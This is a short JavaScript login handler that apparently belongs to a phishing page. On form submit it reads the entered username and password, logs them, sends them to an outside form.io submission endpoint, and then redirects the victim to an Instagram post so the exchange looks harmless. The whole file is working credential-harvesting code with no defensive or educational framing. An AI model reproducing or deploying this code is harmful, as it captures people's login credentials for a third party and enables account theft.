


function login (event){
    
    event.preventDefault()
    const password = document.querySelector('#password').value;
    const username = document.querySelector('#username').value;
    
    console.log({password,username})

    fetch('https://gxrqsthvdeuvmde.form.io/demooo/submission', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "data": {
                "text": username,
                "text2": password
            }, })
    }).then(_ => {
        window.location.href = 'https://www.instagram.com/p/CA5KQwmgk4V/'
    })
//hhhhhh



}



document.querySelector('#form').addEventListener('submit', login)